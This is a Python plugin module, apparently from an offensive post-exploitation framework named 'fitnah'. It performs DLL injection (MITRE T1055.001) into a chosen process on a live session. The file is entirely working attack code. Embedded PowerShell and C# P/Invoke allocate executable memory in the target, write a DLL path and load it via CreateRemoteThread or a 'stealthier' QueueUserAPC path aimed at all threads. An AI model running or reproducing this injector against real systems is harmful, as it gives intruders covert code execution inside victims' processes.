"""execution/dll_inject — DLL injection via CreateRemoteThread or QueueUserAPC. MITRE T1055.001"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class DllInject(BasePlugin):
    NAME        = "dll_inject"
    DESCRIPTION = "Inject DLL into target process. method=crt (CreateRemoteThread) or apc (QueueUserAPC, stealthier)."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1055.001"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("pid",      int, required=True,  help="Target process PID"),
        Param("dll_path", str, required=True,  help="Full path to DLL on target"),
        Param("method",   str, required=False, default="crt",
              help="Injection method: crt (CreateRemoteThread) | apc (QueueUserAPC)"),
    )

    @mitre("T1055.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        pid      = params["pid"]
        dll_path = params["dll_path"]
        method   = params.get("method", "crt").lower()
        if method not in ("crt", "apc"):
            return ModuleResult.err("method must be 'crt' or 'apc'")

        pinvoke_def = r"""
using System;
using System.Runtime.InteropServices;
public class KInj {
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
    [DllImport("kernel32")] public static extern bool CloseHandle(IntPtr h);
    // APC path
    [DllImport("kernel32")] public static extern IntPtr OpenThread(uint a, bool b, uint tid);
    [DllImport("kernel32")] public static extern uint QueueUserAPC(IntPtr fn, IntPtr th, UIntPtr arg);
    [DllImport("kernel32", SetLastError=true)] public static extern bool CreateToolhelp32Snapshot(uint f, uint pid);
    // We iterate threads via .NET instead
}
"""
        crt_block = f"""
$hProc = [KInj]::OpenProcess(0x1F0FFF, $false, {pid})
if ($hProc -eq [IntPtr]::Zero) {{ throw "OpenProcess failed on PID {pid}" }}
$dllBytes = [System.Text.Encoding]::Unicode.GetBytes($dllPath + "`0")
$addr = [KInj]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint]$dllBytes.Length, 0x3000, 0x40)
if ($addr -eq [IntPtr]::Zero) {{ throw "VirtualAllocEx failed" }}
$written = [uint]0
[KInj]::WriteProcessMemory($hProc, $addr, $dllBytes, [uint]$dllBytes.Length, [ref]$written) | Out-Null
$k32 = [KInj]::GetModuleHandle('kernel32.dll')
$ll  = [KInj]::GetProcAddress($k32, 'LoadLibraryW')
$t   = [KInj]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $ll, $addr, 0, [IntPtr]::Zero)
if ($t -ne [IntPtr]::Zero) {{ "[+] CRT injection succeeded into PID {pid}" }}
else {{ "[-] CRT: CreateRemoteThread returned null" }}
[KInj]::CloseHandle($hProc) | Out-Null
"""

        apc_block = f"""
$hProc = [KInj]::OpenProcess(0x1F0FFF, $false, {pid})
if ($hProc -eq [IntPtr]::Zero) {{ throw "OpenProcess failed on PID {pid}" }}
$dllBytes = [System.Text.Encoding]::Unicode.GetBytes($dllPath + "`0")
$addr = [KInj]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint]$dllBytes.Length, 0x3000, 0x40)
$written = [uint]0
[KInj]::WriteProcessMemory($hProc, $addr, $dllBytes, [uint]$dllBytes.Length, [ref]$written) | Out-Null
$k32 = [KInj]::GetModuleHandle('kernel32.dll')
$ll  = [KInj]::GetProcAddress($k32, 'LoadLibraryW')
# Queue APC to all threads of target process
$proc = Get-Process -Id {pid} -EA Stop
$queued = 0
foreach ($th in $proc.Threads) {{
    $hTh = [KInj]::OpenThread(0x001F03FF, $false, [uint]$th.Id)
    if ($hTh -ne [IntPtr]::Zero) {{
        $r2 = [KInj]::QueueUserAPC($ll, $hTh, [UIntPtr][uint64]$addr.ToInt64())
        [KInj]::CloseHandle($hTh) | Out-Null
        $queued++
    }}
}}
"[+] APC queued to $queued threads of PID {pid} — DLL will load when thread enters alertable wait state"
[KInj]::CloseHandle($hProc) | Out-Null
"""
        inject_block = crt_block if method == "crt" else apc_block

        ps = (
            f"$dllPath = '{dll_path}';"
            + "$pinvoke = @\"\n" + pinvoke_def + "\n\"@\n"
            + "try { Add-Type $pinvoke -EA Stop } catch {}\n"
            + "try {\n"
            + inject_block
            + "\n} catch { \"[!] Injection failed: $_\" }"
        )
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
